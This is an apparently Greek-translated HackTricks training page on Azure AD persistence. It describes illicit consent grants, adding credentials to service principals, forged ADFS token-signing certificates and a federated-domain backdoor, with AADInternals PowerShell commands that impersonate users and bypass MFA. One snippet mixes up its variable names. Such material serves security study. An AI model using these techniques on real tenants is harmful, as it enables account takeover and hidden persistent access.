# Az - Persistence

{{#include ../../../banners/hacktricks-training.md}}

### Παράνομη Χορήγηση Συγκατάθεσης

Από προεπιλογή, οποιοσδήποτε χρήστης μπορεί να καταχωρήσει μια εφαρμογή στο Azure AD. Έτσι, μπορείτε να καταχωρήσετε μια εφαρμογή (μόνο για τον στοχοθετημένο ενοικιαστή) που χρειάζεται δικαιώματα υψηλής επιρροής με συγκατάθεση διαχειριστή (και να την εγκρίνετε αν είστε ο διαχειριστής) - όπως η αποστολή email εκ μέρους ενός χρήστη, η διαχείριση ρόλων κ.λπ. Αυτό θα μας επιτρέψει να **εκτελέσουμε επιθέσεις phishing** που θα ήταν πολύ **κερδοφόρες** σε περίπτωση επιτυχίας.

Επιπλέον, θα μπορούσατε επίσης να αποδεχθείτε αυτή την εφαρμογή με τον χρήστη σας ως έναν τρόπο διατήρησης πρόσβασης σε αυτήν.

### Εφαρμογές και Υπηρεσίες Principals

Με προνόμια Διαχειριστή Εφαρμογών, GA ή έναν προσαρμοσμένο ρόλο με δικαιώματα microsoft.directory/applications/credentials/update, μπορούμε να προσθέσουμε διαπιστευτήρια (μυστικό ή πιστοποιητικό) σε μια υπάρχουσα εφαρμογή.

Είναι δυνατόν να **στοχεύσουμε μια εφαρμογή με υψηλά δικαιώματα** ή **να προσθέσουμε μια νέα εφαρμογή** με υψηλά δικαιώματα.

Ένας ενδιαφέρον ρόλος για να προστεθεί στην εφαρμογή θα ήταν ο **ρόλος διαχειριστή προνομιακής αυθεντικοποίησης** καθώς επιτρέπει να **επαναφέρετε τον κωδικό πρόσβασης** των Παγκόσμιων Διαχειριστών.

Αυτή η τεχνική επιτρέπει επίσης να **παρακαμφθεί το MFA**.
```powershell
$passwd = ConvertTo-SecureString "J~Q~QMt_qe4uDzg53MDD_jrj_Q3P.changed" -AsPlainText -Force
$creds = New-Object System.Management.Automation.PSCredential("311bf843-cc8b-459c-be24-6ed908458623", $passwd)
Connect-AzAccount -ServicePrincipal -Credential $credentials -Tenant e12984235-1035-452e-bd32-ab4d72639a
```
- Για την αυθεντικοποίηση με βάση το πιστοποιητικό
```powershell
Connect-AzAccount -ServicePrincipal -Tenant <TenantId> -CertificateThumbprint <Thumbprint> -ApplicationId <ApplicationId>
```
### Federation - Token Signing Certificate

Με **δικαιώματα DA** σε on-prem AD, είναι δυνατόν να δημιουργήσουμε και να εισάγουμε **νέα πιστοποιητικά υπογραφής Token** και **πιστοποιητικά αποκρυπτογράφησης Token** που έχουν πολύ μεγάλη διάρκεια ισχύος. Αυτό θα μας επιτρέψει να **συνδεθούμε ως οποιοσδήποτε χρήστης** του οποίου το ImuutableID γνωρίζουμε.

**Εκτελέστε** την παρακάτω εντολή ως **DA στον ADFS server(s)** για να δημιουργήσετε νέα πιστοποιητικά (προεπιλεγμένος κωδικός πρόσβασης 'AADInternals'), να τα προσθέσετε στο ADFS, να απενεργοποιήσετε την αυτόματη ανανέωση και να επανεκκινήσετε την υπηρεσία:
```powershell
New-AADIntADFSSelfSignedCertificates
```
Στη συνέχεια, ενημερώστε τις πληροφορίες πιστοποίησης με το Azure AD:
```powershell
Update-AADIntADFSFederationSettings -Domain cyberranges.io
```
### Ομοσπονδία - Εμπιστευμένος Τομέας

Με δικαιώματα GA σε έναν ενοικιαστή, είναι δυνατόν να **προσθέσετε έναν νέο τομέα** (πρέπει να επαληθευτεί), να ρυθμίσετε τον τύπο αυθεντικοποίησής του σε Ομοσπονδία και να ρυθμίσετε τον τομέα να **εμπιστεύεται ένα συγκεκριμένο πιστοποιητικό** (any.sts στην παρακάτω εντολή) και εκδότη:
```powershell
# Using AADInternals
ConvertTo-AADIntBackdoor -DomainName cyberranges.io

# Get ImmutableID of the user that we want to impersonate. Using Msol module
Get-MsolUser | select userPrincipalName,ImmutableID

# Access any cloud app as the user
Open-AADIntOffice365Portal -ImmutableID qIMPTm2Q3kimHgg4KQyveA== -Issuer "http://any.sts/B231A11F" -UseBuiltInCertificate -ByPassMFA$true
```
## Αναφορές

- [https://aadinternalsbackdoor.azurewebsites.net/](https://aadinternalsbackdoor.azurewebsites.net/)

{{#include ../../../banners/hacktricks-training.md}}
